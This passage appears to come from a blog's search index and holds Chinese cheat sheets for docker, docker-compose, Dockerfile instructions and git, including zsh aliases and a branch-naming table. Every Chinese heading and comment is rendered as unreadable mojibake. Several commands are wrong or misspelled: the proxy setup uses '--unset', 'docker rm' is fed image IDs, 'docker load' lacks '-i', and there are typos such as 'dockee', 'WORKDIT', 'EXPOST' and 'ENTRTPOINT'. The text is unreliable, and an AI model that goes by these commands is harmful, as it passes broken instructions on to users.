æ¨é€åˆ°Hub</span></span><br><span class="line">docker push new-repo:tagname</span><br></pre></td></tr></table></figure>



<h2 id="å®¹å™¨å‘½ä»¤"><a href="#å®¹å™¨å‘½ä»¤" class="headerlink" title="å®¹å™¨å‘½ä»¤"></a>å®¹å™¨å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¿è¡Œå®¹å™¨</span></span><br><span class="line">docker run [param] &lt;image&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># runå‚æ•°è¯´æ˜</span></span><br><span class="line">  --name=<span class="string">&quot;Name&quot;</span>		<span class="comment"># å®¹å™¨åå­— ç”¨æ¥åŒºåˆ†</span></span><br><span class="line">  -d	<span class="comment"># åå°æ–¹å¼è¿è¡Œ</span></span><br><span class="line">  -it	<span class="comment"># ä½¿ç”¨äº¤äº’æ–¹å¼è¿è¡Œ</span></span><br><span class="line">  -p	<span class="comment"># æŒ‡å®šå®¹å™¨ç«¯å£ -p 8080:8080</span></span><br><span class="line">    -p	 <span class="comment"># ip:ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£</span></span><br><span class="line">    -p	 <span class="comment"># ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£</span></span><br><span class="line">    -p	 <span class="comment"># å®¹å™¨ç«¯å£</span></span><br><span class="line">  -P	<span class="comment"># å¤§å†™P éšæœºç«¯å£</span></span><br><span class="line"></span><br><span class="line">dockee ps	<span class="comment"># æŸ¥çœ‹æ­£åœ¨è¿è¡Œå®¹å™¨</span></span><br><span class="line">docker ps -a	<span class="comment"># æŸ¥çœ‹å…¨éƒ¨å®¹å™¨</span></span><br><span class="line">docker ps -a --no-trunc	<span class="comment"># æ˜¾ç¤ºæ‰€ä»¥å¯åŠ¨å‚æ•°</span></span><br><span class="line">docker <span class="built_in">rm</span> &lt;containerID&gt; <span class="comment"># åˆ é™¤å®¹å™¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å®¹å™¨è¯¦ç»†ä¿¡æ¯</span></span><br><span class="line">docker inspect &lt;container&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å®¹å™¨å ç”¨ç©ºé—´</span></span><br><span class="line">docker system <span class="built_in">df</span> -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤å…¨éƒ¨å®¹å™¨</span></span><br><span class="line">docker <span class="built_in">rm</span> -f $(docker images -aq)</span><br><span class="line"></span><br><span class="line">docker start &lt;container&gt;	<span class="comment"># å¯åŠ¨å®¹å™¨</span></span><br><span class="line">docker restart &lt;container&gt;	<span class="comment"># é‡å¯å®¹å™¨</span></span><br><span class="line">docker stop &lt;container&gt;		<span class="comment"># åœæ­¢å®¹å™¨</span></span><br><span class="line">docker <span class="built_in">kill</span> &lt;container&gt;		<span class="comment"># å¼ºåˆ¶åœæ­¢å®¹å™¨</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> &lt;container&gt;		<span class="comment"># å¼€å¯æ–°çš„ç»ˆç«¯</span></span><br><span class="line">docker attach &lt;container&gt;	<span class="comment"># è¿›å…¥å½“å‰è¿è¡Œç»ˆç«¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># äº¤äº’æ¨¡å¼è¿›å…¥æ­£åœ¨è¿è¡Œå®¹å™¨ </span></span><br><span class="line">docker <span class="built_in">exec</span> -it &lt;container&gt; /bin/bash	</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»å®¹å™¨å†…æ‹·è´æ–‡ä»¶åˆ°ä¸»æœº</span></span><br><span class="line">docker <span class="built_in">cp</span> &lt;container&gt;:å®¹å™¨è·¯å¾„ ä¸»æœºè·¯å¾„</span><br><span class="line"><span class="comment"># ä»ä¸»æœºå†…æ‹·è´æ–‡ä»¶åˆ°å®¹å™¨</span></span><br><span class="line">docker <span class="built_in">cp</span> ä¸»æœºè·¯å¾„ &lt;container&gt;:å®¹å™¨è·¯å¾„</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–°å®¹å™¨é…ç½®</span></span><br><span class="line">docker update</span><br><span class="line"><span class="comment"># è®¾ç½®å®¹å™¨è‡ªå¯åŠ¨</span></span><br><span class="line">docker update â€“restart=always</span><br></pre></td></tr></table></figure>



<h2 id="é€€å‡ºå‘½ä»¤"><a href="#é€€å‡ºå‘½ä»¤" class="headerlink" title="é€€å‡ºå‘½ä»¤"></a>é€€å‡ºå‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åœæ­¢å¹¶é€€å‡º</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment"># é€€å‡ºä¸åœæ­¢ï¼ˆå¿«æ·é”®ï¼‰</span></span><br><span class="line">Ctrl + P + Q</span><br></pre></td></tr></table></figure>

<h2 id="æŒ‚è½½å‘½ä»¤"><a href="#æŒ‚è½½å‘½ä»¤" class="headerlink" title="æŒ‚è½½å‘½ä»¤"></a>æŒ‚è½½å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ -v æŒ‚è½½</span></span><br><span class="line">docker run -it -v &lt;ä¸»æœºç›®å½•&gt;:&lt;å®¹å™¨ç›®å½•&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‡å®šè·¯å¾„æŒ‚è½½</span></span><br><span class="line">docker run -it -v /home/test:/home centos /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒ¿åæŒ‚è½½ -v å®¹å™¨å†…è·¯å¾„</span></span><br><span class="line">docker run -d -P --name nginx01 -v /ect/nginx nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ‰€æœ‰ volume çš„æƒ…å†µ</span></span><br><span class="line">docker volume <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…·åæŒ‚è½½</span></span><br><span class="line">docker run -d -P --name nginx02 -v v-nginx:/etc/nginx nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡ -v å®¹å™¨è·¯å¾„ ro rw æ”¹å˜è¯»å†™æƒé™</span></span><br><span class="line">  ro	<span class="built_in">readonly</span> 		<span class="comment"># åªè¯»</span></span><br><span class="line">  rw	readwrite		<span class="comment"># å¯è¯»å¯å†™</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åªè¯»æƒé™è®¾ç½®</span></span><br><span class="line">dockers run -d -P --name nginx02 -v nginx:/etc/nginx:ro</span><br></pre></td></tr></table></figure>

<h2 id="ç½‘ç»œå‘½ä»¤"><a href="#ç½‘ç»œå‘½ä»¤" class="headerlink" title="ç½‘ç»œå‘½ä»¤"></a>ç½‘ç»œå‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker network <span class="built_in">ls</span>		<span class="comment"># æŸ¥çœ‹ç½‘ç»œåˆ—è¡¨</span></span><br><span class="line">docker network inspect &lt;name&gt;	<span class="comment"># æŸ¥çœ‹ç½‘ç»œè¯¦æƒ…</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --net æŒ‡å®šç½‘å¡(dockeré»˜è®¤æ˜¯bridge)</span></span><br><span class="line">docker run -d -P --net bridge tomcat</span><br><span class="line">	<span class="comment"># è‡ªå®šä¹‰ç½‘ç»œé…ç½®</span></span><br><span class="line">    --driver bridge		<span class="comment"># ç½‘ç»œæ¨¡å¼</span></span><br><span class="line">    --subnet 192.168.0.0/16	<span class="comment"># å­ç½‘</span></span><br><span class="line">    --gateway 192.168.0.1	<span class="comment"># ç½‘å…³</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºè™šæ‹Ÿç½‘å¡</span></span><br><span class="line">docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 net</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®¹å™¨è¿æ¥åˆ°ç½‘å¡ æ‰“é€šå®¹å™¨ä¸å®¹å™¨é—´ç½‘ç»œ</span></span><br><span class="line">docker network connect &lt;net&gt; &lt;ctn&gt;		<span class="comment"># å»ºç«‹æ¡¥æ¥</span></span><br><span class="line">docker network disconnect &lt;net&gt; &lt;ctn&gt;	<span class="comment"># æ–­å¼€æ¡¥æ¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†å®¹å™¨è¿æ¥åˆ°ç½‘ç»œ</span></span><br><span class="line">docker network connect &lt;net&gt; &lt;ctn&gt;</span><br></pre></td></tr></table></figure>



<h2 id="commit-é•œåƒ"><a href="#commit-é•œåƒ" class="headerlink" title="commit é•œåƒ"></a>commit é•œåƒ</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å‘½ä»¤å’Œgitç±»ä¼¼ç±»ä¼¼, æŠŠè‡ªå·±ä¿®æ”¹çš„ä¸œè¥¿å½¢æˆä¸€ä¸ªå±‚ å°è£…æˆä¸€ä¸ªé•œåƒ</span></span><br><span class="line">docker commit -m=<span class="string">&#x27;æè¿°ä¿¡æ¯&#x27;</span> -a=<span class="string">&#x27;ä½œè€…&#x27;</span> å®¹å™¨<span class="built_in">id</span> ç›®æ ‡é•œåƒå</span><br></pre></td></tr></table></figure>



<h2 id="è¿ç§»æ“ä½œ"><a href="#è¿ç§»æ“ä½œ" class="headerlink" title="è¿ç§»æ“ä½œ"></a>è¿ç§»æ“ä½œ</h2><p><strong>é•œåƒ</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å‹ç¼©é•œåƒ</span></span><br><span class="line">docker save -o image-name.tar image-name </span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½é•œåƒ</span></span><br><span class="line">docker load image-name.tar</span><br></pre></td></tr></table></figure>

<p><strong>å®¹å™¨</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¯¼å‡ºå®¹å™¨åˆ°taræ–‡ä»¶</span></span><br><span class="line">docker <span class="built_in">export</span> container-name container-name.tar</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½å®¹å™¨æ–‡ä»¶åˆ›å»ºé•œåƒæ–‡ä»¶</span></span><br><span class="line">docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]</span><br></pre></td></tr></table></figure>



<h2 id="DockerFile-å‘½ä»¤"><a href="#DockerFile-å‘½ä»¤" class="headerlink" title="DockerFile å‘½ä»¤"></a>DockerFile å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”Ÿæˆé•œåƒ</span></span><br><span class="line">docker build -f dockerfileæ–‡ä»¶ -t é•œåƒå:[tag] .</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹åˆå§‹åŒ–è¿è¡Œè®°å½•</span></span><br><span class="line">docker <span class="built_in">history</span> é•œåƒ<span class="built_in">id</span></span><br></pre></td></tr></table></figure>



<h2 id="DockerFile-æŒ‡ä»¤"><a href="#DockerFile-æŒ‡ä»¤" class="headerlink" title="DockerFile æŒ‡ä»¤"></a>DockerFile æŒ‡ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM		<span class="comment"># åŸºç¡€é•œåƒ ä¸€åˆ‡ä»è¿™é‡Œå¼€å§‹æ„å»º</span></span><br><span class="line">MAINTAINER	<span class="comment"># é•œåƒæ˜¯è°å†™çš„ name+mail</span></span><br><span class="line">RUN		<span class="comment"># é•œåƒæ„å»ºæ—¶å€™è¿è¡Œçš„å‘½ä»¤</span></span><br><span class="line">ADD		<span class="comment"># æ·»åŠ æ–‡ä»¶ urlæˆ–è·¯å¾„</span></span><br><span class="line">WORKDIT		<span class="comment"># é•œåƒå·¥ä½œç›®å½•</span></span><br><span class="line">VOLUME		<span class="comment"># æŒ‚è½½çš„ç›®å½•</span></span><br><span class="line">EXPOST		<span class="comment"># ä¿ç•™ç«¯å£é…ç½®</span></span><br><span class="line">CMD		<span class="comment"># æŒ‡å®šè¿™ä¸ªå®¹å™¨å¯åŠ¨æ—¶å€™è¿è¡Œçš„å‘½ä»¤, åªæœ‰æœ€åä¸€ä¸ªä¼šç”Ÿæ•ˆ, å¯è¢«æ›¿ä»£</span></span><br><span class="line">ENTRTPOINT	<span class="comment"># æŒ‡å®šè¿™ä¸ªå®¹å™¨å¯åŠ¨æ—¶å€™è¦è¿è¡Œçš„å‘½ä»¤, å¯ä»¥è¿½åŠ å‘½ä»¤</span></span><br><span class="line">ONBUILD		<span class="comment"># è¢«ç»§æ‰¿ DockerFile æ—¶å€™è¿è¡Œ, è§¦å‘å‘½ä»¤</span></span><br><span class="line">COPY		<span class="comment"># ç±»ä¼¼ADD, å°†æ–‡ä»¶æ‹·è´åˆ°é•œåƒ</span></span><br><span class="line">ENV		<span class="comment"># æ„å»ºæ—¶å€™è®¾ç½®ç¯å¢ƒå˜é‡</span></span><br></pre></td></tr></table></figure>



<h2 id="docker-compose-å‘½ä»¤"><a href="#docker-compose-å‘½ä»¤" class="headerlink" title="docker-compose å‘½ä»¤"></a>docker-compose å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up                  <span class="comment"># å¯åŠ¨æ‰€æœ‰å®¹å™¨</span></span><br><span class="line">docker-compose up -d               <span class="comment"># åå°å¯åŠ¨å¹¶è¿è¡Œæ‰€æœ‰å®¹å™¨</span></span><br><span class="line">docker-compose up --no-recreate -d <span class="comment"># ä¸é‡æ–°åˆ›å»ºå·²ç»åœæ­¢çš„å®¹å™¨</span></span><br><span class="line">docker-compose up -d test2         <span class="comment"># åªå¯åŠ¨test2è¿™ä¸ªå®¹å™¨</span></span><br><span class="line">docker-compose stop                <span class="comment"># åœæ­¢å®¹å™¨</span></span><br><span class="line">docker-compose start               <span class="comment"># å¯åŠ¨å®¹å™¨</span></span><br><span class="line">docker-compose down                <span class="comment"># åœæ­¢å¹¶é”€æ¯å®¹å™¨</span></span><br></pre></td></tr></table></figure>



<h2 id="ç–‘éš¾æ‚ç—‡"><a href="#ç–‘éš¾æ‚ç—‡" class="headerlink" title="ç–‘éš¾æ‚ç—‡"></a>ç–‘éš¾æ‚ç—‡</h2><p>dbå®¹å™¨æ— æ³•è¿æ¥è§£å†³æ–¹æ³•<br>é”™è¯¯ä¿¡æ¯: <code>Access denied for user &#39;root&#39;@&#39;172.18.0.5&#39; (using password: YES)</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose down --volumes</span><br><span class="line">docker-compose up -d --build</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å‘½ä»¤æ–‡æ¡£</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>git å‘½ä»¤æ–‡æ¡£</title>
    <url>/git/</url>
    <content><![CDATA[<h2 id="é…ç½®å‘½ä»¤"><a href="#é…ç½®å‘½ä»¤" class="headerlink" title="é…ç½®å‘½ä»¤"></a>é…ç½®å‘½ä»¤</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config user.name &lt;name&gt;</span><br><span class="line">git config user.email &lt;email&gt;</span><br><span class="line">git config --global user.name &lt;name&gt;	<span class="comment"># é…ç½®å…¨å±€ç”¨æˆ·å</span></span><br><span class="line">git config --global user.email &lt;email&gt;	<span class="comment"># é…ç½®å…¨å±€é‚®ç®±</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é¢œè‰²æ ‡è¯†ï¼ˆé»˜è®¤å¼€å¯ï¼‰</span></span><br><span class="line">git config --global color.ui <span class="literal">true</span></span><br><span class="line">git config --global color.status auto</span><br><span class="line">git config --global color.diff auto</span><br><span class="line">git config --global color.branch auto</span><br><span class="line">git config --global color.interactive auto</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®ä»£ç†</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy &lt;proxy&gt;</span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy &lt;proxy&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å–æ¶ˆä»£ç†</span></span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹é…ç½®</span></span><br><span class="line">git config list</span><br></pre></td></tr></table></figure>



<h2 id="åŸºç¡€å‘½ä»¤"><a href="#åŸºç¡€å‘½ä»¤" class="headerlink" title="åŸºç¡€å‘½ä»¤"></a>åŸºç¡€å‘½ä»¤</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆå§‹åŒ–ä»“åº“</span></span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…‹éš†ä»“åº“</span></span><br><span class="line">git <span class="built_in">clone</span> &lt;url&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ æ–‡ä»¶åˆ°index</span></span><br><span class="line">git add &lt;pathspec&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤indexä¸­çš„æ–‡ä»¶</span></span><br><span class="line">git <span class="built_in">rm</span> &lt;pathspec&gt;</span><br><span class="line"><span class="comment"># åˆ é™¤æœªæäº¤ç¼“å­˜</span></span><br><span class="line">git <span class="built_in">rm</span> --cached &lt;pathspec&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ä»“åº“çŠ¶æ€</span></span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ—¥å¿—</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line"><span class="comment"># æŸ¥çœ‹åˆ†æ”¯åˆå¹¶</span></span><br><span class="line">git <span class="built_in">log</span> --graph</span><br><span class="line"><span class="comment"># ç²¾ç®€æŸ¥çœ‹</span></span><br><span class="line">git <span class="built_in">log</span> --graph --pretty=oneline --abbrev-commit</span><br><span class="line"></span><br><span class="line">git commit -m &lt;message&gt;			<span class="comment"># æäº¤æ–‡ä»¶, é™„å¸¦ç‰ˆæœ¬è¯´æ˜</span></span><br><span class="line">git commit --amend -m &lt;message&gt;		<span class="comment"># åˆå¹¶ä¸Šä¸€æ¬¡æäº¤ï¼ˆç”¨äºåå¤ä¿®æ”¹ï¼‰</span></span><br><span class="line">git commit -am &lt;message&gt;		<span class="comment"># å°†addå’Œcommitåˆä¸ºä¸€æ­¥</span></span><br><span class="line"></span><br><span class="line">git remote -v				<span class="comment"># æŸ¥çœ‹è¿œç¨‹ä»“åº“åœ°å€</span></span><br><span class="line">git remote add origin &lt;url&gt;		<span class="comment"># æ·»åŠ originåˆ†æ”¯</span></span><br><span class="line">git remote <span class="built_in">rm</span> origin			<span class="comment"># åˆ é™¤originåˆ†æ”¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡æ–°è®¾ç½®è¿œç¨‹ä»“åº“åœ°å€</span></span><br><span class="line">git remote set-url origin &lt;git.url&gt;</span><br><span class="line"></span><br><span class="line">git pull	<span class="comment"># æ‹‰ ç®€å†™å½¢å¼</span></span><br><span class="line">git pull origin master			<span class="comment"># åŒæ­¥è¿œç¨‹ä»“åº“æ›´æ–°åˆ°masteråˆ†æ”¯</span></span><br><span class="line"></span><br><span class="line">git push	<span class="comment"># æ¨ ç®€å†™å½¢å¼</span></span><br><span class="line">git push -u origin master		<span class="comment"># æ¨é€æœ¬åœ°ä»“åº“åˆ°originåˆ†æ”¯</span></span><br><span class="line"></span><br><span class="line">git push -f <span class="comment"># å¼ºåˆ¶æ¨é€åˆ†æ”¯, ä¼šè¦†ç›–ä¿®æ”¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®å½“å‰åˆ†æ”¯çš„å…³è”çš„è¿œç¨‹åˆ†æ”¯</span></span><br><span class="line">git branch --set-upstream-to=origin/master master</span><br></pre></td></tr></table></figure>



<h2 id="è¿›é˜¶å‘½ä»¤"><a href="#è¿›é˜¶å‘½ä»¤" class="headerlink" title="è¿›é˜¶å‘½ä»¤"></a>è¿›é˜¶å‘½ä»¤</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹ differenceï¼ˆå·®å¼‚ï¼‰</span></span><br><span class="line">git diff		<span class="comment"># å·¥ä½œåŒºä¸æš‚å­˜åŒº</span></span><br><span class="line">git diff --cached 	<span class="comment"># æš‚å­˜åŒºä¸ç‰ˆæœ¬åº“</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å›æ»šåˆ°ä¸Šä¸€ç‰ˆæœ¬ HEAD~100 å‰100ä¸ªç‰ˆæœ¬ å¯æŒ‡å®š&lt;ç‰ˆæœ¬å·&gt;</span></span><br><span class="line">git reset --hard HEAD^</span><br><span class="line">git reset &lt;ç‰ˆæœ¬å·&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ‰€æœ‰ç‰ˆæœ¬ åŒ…æ‹¬å›é€€è¿‡çš„</span></span><br><span class="line">git reflog</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹åˆ†æ”¯</span></span><br><span class="line">git branch</span><br><span class="line">git branch &lt;branch&gt; 	<span class="comment"># åˆ›å»ºåˆ†æ”¯</span></span><br><span class="line">git branch -d &lt;branch&gt;	<span class="comment"># åˆ é™¤åˆ†æ”¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¢å¤ï¼ˆåˆ é™¤ï¼‰å·¥ä½œåŒºæ›´æ”¹</span></span><br><span class="line">git checkout</span><br><span class="line">git checkout &lt;branch&gt; 	<span class="comment"># åˆ‡æ¢åˆ†æ”¯</span></span><br><span class="line">git checkout -b &lt;branch&gt;<span class="comment"># åˆ›å»ºå¹¶åˆ‡æ¢åˆ†æ”¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå¹¶åˆ†æ”¯</span></span><br><span class="line">git merge &lt;branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ‰€æœ‰è¿œç¨‹åˆ†æ”¯ï¼ˆä¸æ›´æ–°æœ¬åœ°åˆ†æ”¯ï¼Œå¦éœ€mergeï¼‰</span></span><br><span class="line">git fetch</span><br><span class="line"><span class="comment"># è·å–æ‰€æœ‰åŸåˆ›åˆ†æ”¯å¹¶æ¸…é™¤æœåŠ¡å™¨ä¸Šå·²åˆ æ‰çš„åˆ†æ”¯</span></span><br><span class="line">git fetch --prune</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå¹¶åˆ†æ”¯ä½†ä¸ä¸¢å¼ƒåˆ†æ”¯ä¿¡æ¯</span></span><br><span class="line">git merge --no-ff -m <span class="string">&quot;merge with no-ff&quot;</span> &lt;branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸´æ—¶åˆ†æ”¯</span></span><br><span class="line">git stash</span><br><span class="line">git stash list	<span class="comment"># æŸ¥çœ‹ä¸´æ—¶åˆ†æ”¯</span></span><br><span class="line">git stash drop	<span class="comment"># åˆ é™¤stash</span></span><br><span class="line">git stash apply	<span class="comment"># æ¢å¤åˆ†æ”¯å†…å®¹</span></span><br><span class="line">git stash pop	<span class="comment"># æ¢å¤åˆ†æ”¯å†…å®¹å¹¶åˆ é™¤stash</span></span><br><span class="line">git stash apply stash@&#123;0&#125;<span class="comment"># æ¢å¤æŒ‡å®šçš„stash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤åˆ¶ä¸€ä¸ªç‰¹å®šçš„æäº¤åˆ°å½“å‰åˆ†æ”¯</span></span><br><span class="line">git cherry-pick &lt;ç‰ˆæœ¬å·&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ‡æ¢åˆ†æ”¯</span></span><br><span class="line">git checkout 1acd5de</span><br><span class="line"><span class="comment"># ä¿å­˜ä¿®æ”¹ååˆ†æ”¯</span></span><br><span class="line">it switch -c &lt;æ–°åˆ†æ”¯å&gt;</span><br><span class="line"><span class="comment"># æ¢å¤åˆ‡æ¢å‰åˆ†æ”¯</span></span><br><span class="line">git switch -</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ¬åœ°ä»“åº“å¼ºåˆ¶æ›¿æ¢è¿œç¨‹ä»“åº“</span></span><br><span class="line">git push --force --set-upstream origin &lt;branch&gt;</span><br></pre></td></tr></table></figure>



<h3 id="æ›¿æ¢åˆ†æ”¯"><a href="#æ›¿æ¢åˆ†æ”¯" class="headerlink" title="æ›¿æ¢åˆ†æ”¯"></a>æ›¿æ¢åˆ†æ”¯</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å°†masteræ›¿æ¢æˆmainf</span></span><br><span class="line">git checkout main</span><br><span class="line">git merge -s ours master	<span class="comment"># git --strategy=ours ours master</span></span><br><span class="line">git checkout master</span><br><span class="line">git merge main</span><br></pre></td></tr></table></figure>



<h2 id="å­æ¨¡å—"><a href="#å­æ¨¡å—" class="headerlink" title="å­æ¨¡å—"></a>å­æ¨¡å—</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å­æ¨¡å—</span></span><br><span class="line">git submodule</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–</span></span><br><span class="line">git submodule init</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ å­æ¨¡å—</span></span><br><span class="line">git submodule add &lt;é¡¹ç›®åœ°å€&gt; &lt;è·¯å¾„&gt;</span><br><span class="line"><span class="comment"># æ·»åŠ æŒ‡å®šåˆ†æ”¯</span></span><br><span class="line">git submodule add -b v1.0 &lt;é¡¹ç›®åœ°å€&gt; &lt;è·¯å¾„&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–°(å…‹éš†)å­æ¨¡å—</span></span><br><span class="line">git submodule update --init --remote --recursive</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤å­æ¨¡å—</span></span><br><span class="line">git <span class="built_in">rm</span> -rf --cached &lt;è·¯å¾„&gt;</span><br></pre></td></tr></table></figure>



<h2 id="zsh-å¿«æ·å‘½ä»¤"><a href="#zsh-å¿«æ·å‘½ä»¤" class="headerlink" title="zsh å¿«æ·å‘½ä»¤"></a>zsh å¿«æ·å‘½ä»¤</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gapa    	git add --patch</span><br><span class="line">gc!   		git commit -v --amend</span><br><span class="line">gcl  		git <span class="built_in">clone</span> --recursive</span><br><span class="line">gclean    	git reset --hard &amp;&amp; git clean -dfx</span><br><span class="line">gcm    		git checkout master</span><br><span class="line">gcmsg    	git commit -m</span><br><span class="line">gco    		git checkout</span><br><span class="line">gd    		git diff</span><br><span class="line">gdca    	git diff --cached</span><br><span class="line">gp    		git push</span><br><span class="line">grbc    	git rebase --<span class="built_in">continue</span></span><br><span class="line">gst    		git status</span><br><span class="line">gup    		git pull --rebase</span><br></pre></td></tr></table></figure>



<h2 id="åˆ†æ”¯å‘½åè§„èŒƒ"><a href="#åˆ†æ”¯å‘½åè§„èŒƒ" class="headerlink" title="åˆ†æ”¯å‘½åè§„èŒƒ"></a>åˆ†æ”¯å‘½åè§„èŒƒ</h2><table>
<thead>
<tr>
<th>åˆ†æ”¯</th>
<th>å‘½å</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>ä¸»åˆ†æ”¯</td>
<td>master</td>
<td>ä¸»åˆ†æ”¯ï¼Œæ‰€æœ‰æä¾›ç»™ç”¨æˆ·ä½¿ç”¨çš„æ­£å¼ç‰ˆæœ¬ï¼Œéƒ½åœ¨è¿™ä¸ªä¸»åˆ†æ”¯ä¸Šå‘å¸ƒ</td>
</tr>
<tr>
<td>å¼€å‘ä¸»åˆ†æ”¯</td>
<td>dev</td>
<td>å¼€å‘åˆ†æ”¯ï¼Œæ°¸è¿œæ˜¯åŠŸèƒ½æœ€æ–°æœ€å…¨çš„åˆ†æ”¯</td>
</tr>
<tr>
<td>åŠŸèƒ½åˆ†æ”¯</td>
<td>feature-*</td>
<td>æ–°åŠŸèƒ½åˆ†æ”¯ï¼ŒæŸä¸ªåŠŸèƒ½ç‚¹æ­£åœ¨å¼€å‘é˜¶æ®µ</td>
</tr>
<tr>
<td>å‘å¸ƒç‰ˆæœ¬</td>
<td>release-*</td>
<td>å‘å¸ƒå®šæœŸè¦ä¸Šçº¿çš„åŠŸèƒ½</td>
</tr>
<tr>
<td>ä¿®å¤å‘å¸ƒç‰ˆæœ¬åˆ†æ”¯</td>
<td>bugfix-release-*</td>
<td>ä¿®å¤æµ‹è¯•bug</td>
</tr>
<tr>
<td>ç´§æ€¥ä¿®å¤åˆ†æ”¯</td>
<td>bugfix-master-*</td>
<td>ç´§æ€¥ä¿®å¤çº¿ä¸Šä»£ç çš„ bug</td>
</tr>
</tbody></table>
<h2 id="å·¥ä½œæµç¨‹å›¾"><a href="#å·¥ä½œæµç¨‹å›¾" class="headerlink" title="å·¥ä½œæµç¨‹å›¾"></a>å·¥ä½œæµç¨‹å›¾</h2><h3 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h3><p><img data-src="http://img.owq.world/2022/05/1202-904caf.png"></p>
<h3 id="Gitlab"><a href="#Gitlab" class="headerlink" title="Gitlab"></a>Gitlab</h3><p><img data-src="http://img.owq.world/2022/05/1202-f68d47.png"></p>
]]></content>
      <categories>
        <category>å‘½ä»¤æ–‡æ¡£</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>pacman å‘½ä»¤</title>
    <url>/pacman/</url>
